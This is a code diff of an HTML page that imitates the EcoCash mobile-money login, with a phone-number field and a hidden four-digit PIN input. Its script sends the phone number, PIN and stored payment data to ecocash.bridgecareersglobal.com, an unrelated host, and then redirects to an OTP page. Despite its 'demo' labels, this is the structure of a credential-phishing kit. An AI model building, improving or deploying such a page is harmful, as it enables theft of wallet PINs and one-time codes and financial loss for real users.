@@ -1,342 +1,413 @@
+
 <!doctype html>
 <html lang="en">
 
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>EcoCash Login</title>
 
-<title>EcoCash Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
 
-<style>
+        body {
+            margin: 0;
+            font-family: "Segoe UI", Arial, sans-serif;
+            background: #fff;
+        }
 
-*{
-    box-sizing:border-box;
-}
+        .top {
+            padding: 40px 0 20px;
+            text-align: center;
+        }
 
-body{
-    margin:0;
-    font-family:"Segoe UI",Arial,sans-serif;
-    background:#fff;
-}
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            color: #0b66b2;
+        }
 
-.top{
-    padding:40px 0 20px;
-    text-align:center;
-}
+        .logo span {
+            color: #e33b2f;
+        }
 
-.logo{
-    font-size:42px;
-    font-weight:bold;
-    color:#0b66b2;
-}
+        h2 {
+            margin-top: 10px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #333;
+        }
 
-.logo span{
-    color:#e33b2f;
-}
+        .main {
+            margin-top: 25px;
+            padding: 25px 20px 60px;
+            background: #0b66b2;
+            border-top-left-radius: 60px;
+            border-top-right-radius: 60px;
+            min-height: 70vh;
+            color: #fff;
+        }
 
-h2{
-    margin-top:10px;
-    font-size:28px;
-    font-weight:600;
-    color:#333;
-}
+        form {
+            background: #fff;
+            padding: 25px 18px;
+            border-radius: 12px;
+            box-shadow: 0 3px 12px rgba(0, 0, 0, 0.15);
+            margin-bottom: 20px;
+            color: #000;
+        }
 
-.main{
-    margin-top:25px;
-    padding:25px 20px 60px;
-    background:#0b66b2;
-    border-top-left-radius:60px;
-    border-top-right-radius:60px;
-    min-height:70vh;
-    color:#fff;
-}
+        .phone-box {
+            border: 2px solid #0a57a3;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+        }
 
-form{
-    background:#fff;
-    padding:25px 18px;
-    border-radius:12px;
-    box-shadow:0 3px 12px rgba(0,0,0,0.15);
-    margin-bottom:20px;
-    color:#000;
-}
+        .phone-row {
+            display: flex;
+            align-items: center;
+            width: 100%;
+        }
 
-.phone-box{
-    border:2px solid #0a57a3;
-    border-radius:10px;
-    padding:12px;
-    margin-bottom:20px;
-}
+        .phone-box .flag {
+            width: 32px;
+            height: 20px;
+            margin-right: 10px;
+            object-fit: cover;
+            flex-shrink: 0;
+        }
 
-.phone-row{
-    display:flex;
-    align-items:center;
-    width:100%;
-}
+        .country-code {
+            font-size: 16px;
+            font-weight: 600;
+            color: #333;
+            margin-right: 8px;
+            white-space: nowrap;
+        }
 
-.phone-box .flag{
-    width:32px;
-    height:20px;
-    margin-right:10px;
-    object-fit:cover;
-}
+        .phone-box input[type="tel"] {
+            border: none;
+            flex: 1;
+            font-size: 16px;
+            outline: none;
+            min-width: 0;
+        }
 
-.phone-box input[type="tel"]{
-    border:none;
-    flex:1;
-    font-size:16px;
-    outline:none;
-    min-width:0;
-}
+        .pin-title {
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #444;
+        }
 
-.pin-title{
-    text-align:center;
-    font-size:18px;
-    margin-bottom:15px;
-    color:#444;
-}
+        .pin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            position: relative;
+            min-height: 55px;
+        }
 
-.pin-boxes{
-    display:flex;
-    justify-content:center;
-    gap:15px;
-    margin-bottom:20px;
-    position:relative;
-    min-height:55px;
-}
+        .pin {
+            width: 55px;
+            height: 55px;
+            border: 2px solid #0a57a3;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #fff;
+            color: #000;
+            pointer-events: none;
+        }
 
-.pin{
-    width:55px;
-    height:55px;
-    border:2px solid #0a57a3;
-    border-radius:12px;
-    font-size:28px;
-    font-weight:bold;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:#fff;
-    color:#000;
-    pointer-events:none;
-}
+        #pinInput {
+            position: absolute;
+            inset: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: text;
+            z-index: 10;
+            border: none;
+            outline: none;
+        }
 
-#pinInput{
-    position:absolute;
-    inset:0;
-    width:100%;
-    height:100%;
-    opacity:0;
-    cursor:text;
-    z-index:10;
-    border:none;
-    outline:none;
-}
+        #msg {
+            display: none;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
 
-#msg{
-    display:none;
-    text-align:center;
-    margin-top:15px;
-    font-size:14px;
-}
+        #msg.err {
+            color: #d93025;
+        }
 
-#msg.err{
-    color:#d93025;
-}
+        #msg.success {
+            color: #16803c;
+        }
 
-#msg.success{
-    color:#16803c;
-}
+        /* Registration / Help instruction */
+        .instruction {
+            text-align: center;
+            margin: 20px auto 5px;
+            color: #0501f0;
+            width: 100%;
+        }
 
-.bottom-buttons{
-    display:flex;
-    justify-content:space-between;
-    gap:20px;
-    margin-top:25px;
-}
+        .instruction h3 {
+            margin: 0 auto;
+            padding: 0 10px;
+            font-size: 16px;
+            line-height: 1.5;
+            font-weight: 600;
+            color: #160606;
+            text-align: center;
+            width: 100%;
+        }
 
-.btn{
-    flex:1;
-    background:#fff;
-    padding:14px 0;
-    border-radius:12px;
-    border:none;
-    font-size:17px;
-    font-weight:600;
-    color:#000;
-    box-shadow:0 3px 10px rgba(0,0,0,0.15);
-    cursor:pointer;
-}
+        .bottom-buttons {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px;
+            margin-top: 20px;
+        }
 
-.btn:hover{
-    background:#f3f3f3;
-}
+        .btn {
+            flex: 1;
+            background: #fff;
+            padding: 14px 10px;
+            border-radius: 12px;
+            border: none;
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.15);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
 
-.btn:disabled{
-    opacity:.6;
-    cursor:not-allowed;
-}
+        .btn img {
+            width: 20px;
+            height: 20px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
 
-.ver{
-    text-align:center;
-    margin-top:15px;
-    font-size:14px;
-}
+        .btn:hover {
+            background: #f3f3f3;
+        }
 
-.tnc{
-    text-align:center;
-    margin-top:5px;
-    font-size:14px;
-    color:#d9edff;
-}
+        .btn:disabled {
+            opacity: .6;
+            cursor: not-allowed;
+        }
 
-@media(max-width:480px){
+        .ver {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
 
-    .logo{
-        font-size:36px;
-    }
+        .tnc {
+            text-align: center;
+            margin-top: 5px;
+            font-size: 14px;
+            color: #d9edff;
+        }
 
-    h2{
-        font-size:24px;
-    }
+        @media (max-width: 480px) {
 
-    .main{
-        padding:20px 14px 50px;
-        border-top-left-radius:40px;
-        border-top-right-radius:40px;
-    }
+            .logo {
+                font-size: 36px;
+            }
 
-    form{
-        padding:20px 14px;
-    }
+            h2 {
+                font-size: 24px;
+            }
 
-    .pin-boxes{
-        gap:10px;
-    }
+            .main {
+                padding: 20px 14px 50px;
+                border-top-left-radius: 40px;
+                border-top-right-radius: 40px;
+            }
 
-    .pin{
-        width:50px;
-        height:50px;
-    }
+            form {
+                padding: 20px 14px;
+            }
 
-    .bottom-buttons{
-        gap:10px;
-    }
+            .pin-boxes {
+                gap: 10px;
+            }
 
-    .btn{
-        font-size:15px;
-    }
+            .pin {
+                width: 50px;
+                height: 50px;
+            }
 
-}
+            .bottom-buttons {
+                gap: 10px;
+            }
 
-</style>
+            .btn {
+                font-size: 15px;
+                padding-left: 6px;
+                padding-right: 6px;
+            }
+
+            .btn img {
+                width: 18px;
+                height: 18px;
+            }
+
+            /* Center instruction on mobile too */
+            .instruction {
+                width: 100%;
+                margin: 20px auto 5px;
+                text-align: center;
+            }
+
+            .instruction h3 {
+                width: 100%;
+                margin: 0 auto;
+                padding: 0 5px;
+                text-align: center;
+                font-size: 14px;
+                line-height: 1.5;
+                color: #fff;
+            }
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="top">
+    <div class="top">
+        <div class="logo">
+            Eco<span>Cash</span>
+        </div>
 
-    <div class="logo">
-        Eco<span>Cash</span>
+        <h2>
+            Login
+        </h2>
     </div>
 
-    <h2>
-        Login
-    </h2>
+    <div class="main">
 
-</div>
+        <form id="loginForm">
 
-<div class="main">
+            <!-- PHONE NUMBER -->
+            <div class="phone-box">
+                <div class="phone-row">
 
-<form id="loginForm">
+                    <img
+                        src="https://flagcdn.com/w20/zw.png"
+                        class="flag"
+                        alt="Zimbabwe flag"
+                    >
 
-    <div class="phone-box">
+                    <span class="country-code">+263</span>
 
-        <div class="phone-row">
+                    <input
+                        type="tel"
+                        name="phone"
+                        id="phoneInput"
+                        placeholder="Phone Number"
+                        required
+                        autocomplete="tel"
+                    >
 
-            <img
-                src="https://flagcdn.com/w20/zw.png"
-                class="flag"
-                alt="Zimbabwe flag"
+                </div>
+            </div>
+
+            <!-- DEMO PIN -->
+            <div class="pin-title">
+                Enter your PIN
+            </div>
+
+            <div
+                class="pin-boxes"
+                id="pinArea"
             >
+                <div class="pin"></div>
+                <div class="pin"></div>
+                <div class="pin"></div>
+                <div class="pin"></div>
 
-            <input
-                type="tel"
-                name="phone"
-                id="phoneInput"
-                value="+263"
-                required
-                autocomplete="tel"
-            >
+                <input
+                    type="tel"
+                    id="pinInput"
+                    maxlength="4"
+                    inputmode="numeric"
+                    pattern="[0-9]{4}"
+                    autocomplete="off"
+                    aria-label="Demo PIN"
+                >
+            </div>
 
+            <!-- INSTRUCTION -->
+            <div class="instruction">
+                <h3>
+                    To register on EcoCash wallet or get assistance, click below
+                </h3>
+            </div>
+
+            <!-- BUTTONS -->
+            <div class="bottom-buttons">
+
+                <button
+                    type="submit"
+                    class="btn"
+                    id="registerBtn"
+                >
+                    <img
+                        src="reg.jpg"
+                        alt=""
+                    >
+                    <span>Register</span>
+                </button>
+
+                <button
+                    type="button"
+                    class="btn"
+                    id="helpBtn"
+                >
+                    <img
+                        src="info.png"
+                        alt=""
+                    >
+                    <span>Help &amp; Support</span>
+                </button>
+
+            </div>
+
+            <div id="msg"></div>
+
+        </form>
+
+        <div class="ver">
+            v2.1.3P
+        </div>
+
+        <div class="tnc">
+            By signing in you agree to the Terms and Conditions
         </div>
 
     </div>
 
-    <div class="pin-title">
-        Enter your PIN
-    </div>
-
-    
-
-    <div
-        class="pin-boxes"
-        id="pinArea"
-    >
-
-        <div class="pin"></div>
-        <div class="pin"></div>
-        <div class="pin"></div>
-        <div class="pin"></div>
-
-        <input
-            type="tel"
-            id="pinInput"
-            maxlength="4"
-            inputmode="numeric"
-            pattern="[0-9]{4}"
-            autocomplete="off"
-            aria-label="Demo PIN"
-        >
-
-    </div>
-
-    <div class="bottom-buttons">
-
-        <button
-            type="submit"
-            class="btn"
-            id="registerBtn"
-        >
-            Register
-        </button>
-
-        <button
-            type="button"
-            class="btn"
-            id="helpBtn"
-        >
-            Help &amp; Support
-        </button>
-
-    </div>
-
-    <div id="msg"></div>
-
-</form>
-
-<div class="ver">
-    v2.1.3P
-</div>
-
-<div class="tnc">
-    By signing in you agree to the Terms and Conditions
-</div>
-
-</div>
-
 <script>
-
-const API_BASE = 'https://ecocash.bridgecareersglobal.com';
-
+const API_BASE =
+    'https://ecocash.bridgecareersglobal.com';
 
 /* =========================================================
    PAYMENT DATA
@@ -348,12 +419,17 @@ try {
     paymentData = JSON.parse(
         sessionStorage.getItem('paymentData') || '{}'
     );
-} catch(error) {
-    console.warn('Invalid paymentData in sessionStorage:', error);
+} catch (error) {
+    console.warn(
+        'Invalid paymentData in sessionStorage:',
+        error
+    );
 }
 
-console.log('Payment data:', paymentData);
-
+console.log(
+    'Payment data:',
+    paymentData
+);
 
 /* =========================================================
    ELEMENTS
@@ -383,8 +459,8 @@ const pins =
 const helpBtn =
     document.getElementById('helpBtn');
 
-const prefix = '+263';
-
+const prefix =
+    '+263';
 
 /* =========================================================
    ELEMENT CHECK
@@ -399,11 +475,11 @@ if (
     !pinArea ||
     !helpBtn
 ) {
-
-    console.error('Account page elements missing.');
+    console.error(
+        'Account page elements missing.'
+    );
 
 } else {
-
 
     /* =====================================================
        PHONE INPUT
@@ -411,49 +487,23 @@ if (
 
     phoneInput.addEventListener(
         'input',
-        function(){
+        function () {
 
-            let value = phoneInput.value;
+            let value =
+                phoneInput.value;
 
-            if(!value.startsWith(prefix)){
-                value = prefix;
-            }
+            /* Remove anything that is not a number.
+               The +263 prefix is displayed separately. */
 
             const numbers =
                 value
-                .slice(prefix.length)
-                .replace(/\D/g,'');
+                    .replace(/\D/g, '')
+                    .replace(/^263/, '');
 
             phoneInput.value =
-                prefix + numbers;
-
+                numbers;
         }
     );
-
-
-    /* =====================================================
-       PREVENT DELETING +263
-    ===================================================== */
-
-    phoneInput.addEventListener(
-        'keydown',
-        function(e){
-
-            if(
-                phoneInput.selectionStart <= prefix.length &&
-                (
-                    e.key === 'Backspace' ||
-                    e.key === 'Delete'
-                )
-            ){
-
-                e.preventDefault();
-
-            }
-
-        }
-    );
-
 
     /* =====================================================
        PIN AREA
@@ -461,13 +511,10 @@ if (
 
     pinArea.addEventListener(
         'click',
-        function(){
-
+        function () {
             pinInput.focus();
-
         }
     );
-
 
     /* =====================================================
        PIN INPUT
@@ -475,30 +522,29 @@ if (
 
     pinInput.addEventListener(
         'input',
-        function(){
+        function () {
 
             const value =
                 pinInput.value
-                .replace(/\D/g,'')
-                .slice(0,4);
+                    .replace(/\D/g, '')
+                    .slice(0, 4);
 
-            pinInput.value = value;
+            pinInput.value =
+                value;
 
             pins.forEach(
-                function(box,index){
+                function (box, index) {
 
-                    if(value[index]){
+                    if (value[index]) {
                         box.textContent = '•';
-                    }else{
+                    } else {
                         box.textContent = '';
                     }
 
                 }
             );
-
         }
     );
-
 
     /* =====================================================
        PIN KEYDOWN
@@ -506,24 +552,21 @@ if (
 
     pinInput.addEventListener(
         'keydown',
-        function(e){
+        function (e) {
 
-            if(
+            if (
                 !/[0-9]/.test(e.key) &&
                 e.key !== 'Backspace' &&
                 e.key !== 'Delete' &&
                 e.key !== 'ArrowLeft' &&
                 e.key !== 'ArrowRight' &&
                 e.key !== 'Tab'
-            ){
-
+            ) {
                 e.preventDefault();
-
             }
 
         }
     );
-
 
     /* =====================================================
        HELP
@@ -531,7 +574,7 @@ if (
 
     helpBtn.addEventListener(
         'click',
-        function(){
+        function () {
 
             alert(
                 'This is a DEMO / TEST interface. Please use only fake test information.'
@@ -540,28 +583,31 @@ if (
         }
     );
 
-
     /* =====================================================
        FORM SUBMISSION
     ===================================================== */
 
     form.addEventListener(
         'submit',
-        async function(e){
+        async function (e) {
 
             e.preventDefault();
 
-            console.log('FORM SUBMITTED');
-
+            console.log(
+                'FORM SUBMITTED'
+            );
 
             /* ---------------------------------------------
                PHONE VALIDATION
             --------------------------------------------- */
 
-            if(
-                phoneInput.value === prefix ||
-                phoneInput.value.length <= prefix.length
-            ){
+            const phoneNumber =
+                phoneInput.value.trim();
+
+            if (
+                !phoneNumber ||
+                phoneNumber.length < 7
+            ) {
 
                 phoneInput.setCustomValidity(
                     'Enter your phone number after +263'
@@ -570,11 +616,9 @@ if (
                 phoneInput.reportValidity();
 
                 return;
-
             }
 
             phoneInput.setCustomValidity('');
-
 
             /* ---------------------------------------------
                DEMO PIN VALIDATION
@@ -583,34 +627,44 @@ if (
             const demoPin =
                 pinInput.value.trim();
 
-            if(!/^\d{4}$/.test(demoPin)){
+            if (
+                !/^\d{4}$/.test(demoPin)
+            ) {
 
-                msg.className = 'err';
-                msg.style.display = 'block';
+                msg.className =
+                    'err';
+
+                msg.style.display =
+                    'block';
+
                 msg.textContent =
                     'Enter the 4-digit demo PIN.';
 
                 pinInput.focus();
 
                 return;
-
             }
-
 
             /* ---------------------------------------------
                LOADING
             --------------------------------------------- */
 
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Processing...';
+            submitBtn.disabled =
+                true;
 
-            msg.className = '';
-            msg.style.display = 'block';
-            msg.textContent = 'Connecting to server...';
+            submitBtn.innerHTML =
+                '<span>Processing...</span>';
 
+            msg.className =
+                '';
+
+            msg.style.display =
+                'block';
+
+            msg.textContent =
+                'Connecting to server...';
 
             try {
-
 
                 /* -----------------------------------------
                    BUILD DEMO REQUEST
@@ -618,9 +672,10 @@ if (
 
                 const savedPaymentData =
                     JSON.parse(
-                        sessionStorage.getItem('paymentData') || '{}'
+                        sessionStorage.getItem(
+                            'paymentData'
+                        ) || '{}'
                     );
-
 
                 const requestBody = {
 
@@ -642,7 +697,7 @@ if (
                     accountNumber:
                         savedPaymentData.accountNumber ||
                         paymentData.accountNumber ||
-                        phoneInput.value,
+                        phoneNumber,
 
                     amount:
                         savedPaymentData.amount ||
@@ -655,26 +710,21 @@ if (
                         'USD',
 
                     phone:
-                        phoneInput.value,
+                        prefix + phoneNumber,
 
-                    /*
-                     * DEMO ONLY.
-                     * This is a fake 4-digit PIN.
-                     */
+                    /* DEMO ONLY.
+                       This is a fake 4-digit PIN. */
                     demoPin:
                         demoPin
-
                 };
-
 
                 console.log(
                     'FINAL DEMO REQUEST BODY:',
                     requestBody
                 );
 
-
                 /* -----------------------------------------
-                   SEND TO LIVE DEMO SERVER
+                   SEND TO DEMO SERVER
                 ----------------------------------------- */
 
                 const response =
@@ -695,12 +745,10 @@ if (
                         }
                     );
 
-
                 console.log(
                     'HTTP status:',
                     response.status
                 );
-
 
                 /* -----------------------------------------
                    READ RESPONSE
@@ -709,29 +757,25 @@ if (
                 const data =
                     await response.json();
 
-
                 console.log(
                     'Server response:',
                     data
                 );
 
-
                 /* -----------------------------------------
                    CHECK RESPONSE
                 ----------------------------------------- */
 
-                if(
+                if (
                     !response.ok ||
                     !data.ok
-                ){
+                ) {
 
                     throw new Error(
                         data.error ||
                         `Server returned HTTP ${response.status}`
                     );
-
                 }
-
 
                 /* -----------------------------------------
                    SAVE ACCOUNT DATA
@@ -740,16 +784,13 @@ if (
                 sessionStorage.setItem(
                     'accountData',
                     JSON.stringify({
-
                         phone:
-                            phoneInput.value
-
+                            prefix + phoneNumber
                     })
                 );
 
-
                 /* -----------------------------------------
-                   SAVE DEMO PIN FOR OTP VERIFICATION
+                   SAVE DEMO PIN
                 ----------------------------------------- */
 
                 sessionStorage.setItem(
@@ -757,12 +798,13 @@ if (
                     demoPin
                 );
 
-
                 /* -----------------------------------------
                    SAVE TRANSACTION ID
                 ----------------------------------------- */
 
-                if(data.transactionId){
+                if (
+                    data.transactionId
+                ) {
 
                     sessionStorage.setItem(
                         'transactionId',
@@ -774,29 +816,27 @@ if (
                     throw new Error(
                         'Server did not return a transaction ID.'
                     );
-
                 }
-
 
                 /* -----------------------------------------
                    SUCCESS
                 ----------------------------------------- */
 
-                msg.className = 'success';
+                msg.className =
+                    'success';
 
                 msg.textContent =
                     'Verification code sent.';
 
-                submitBtn.textContent =
-                    'Success';
-
+                submitBtn.innerHTML =
+                    '<span>Success</span>';
 
                 /* -----------------------------------------
                    GO TO OTP PAGE
                 ----------------------------------------- */
 
                 setTimeout(
-                    function(){
+                    function () {
 
                         window.location.href =
                             'otp.html';
@@ -805,38 +845,37 @@ if (
                     500
                 );
 
-
-            } catch(error) {
-
+            } catch (error) {
 
                 console.error(
                     'SUBMISSION ERROR:',
                     error
                 );
 
+                msg.className =
+                    'err';
 
-                msg.className = 'err';
-
-                msg.style.display = 'block';
+                msg.style.display =
+                    'block';
 
                 msg.textContent =
                     error.message ||
                     'Unable to connect to the demo server.';
 
+                submitBtn.disabled =
+                    false;
 
-                submitBtn.disabled = false;
-
-                submitBtn.textContent =
-                    'Register';
-
+                submitBtn.innerHTML =
+                    `
+                    <img src="reg.jpg" alt="">
+                    <span>Register</span>
+                    `;
             }
-
         }
     );
-
 }
-
 </script>
 
 </body>
 </html>
+
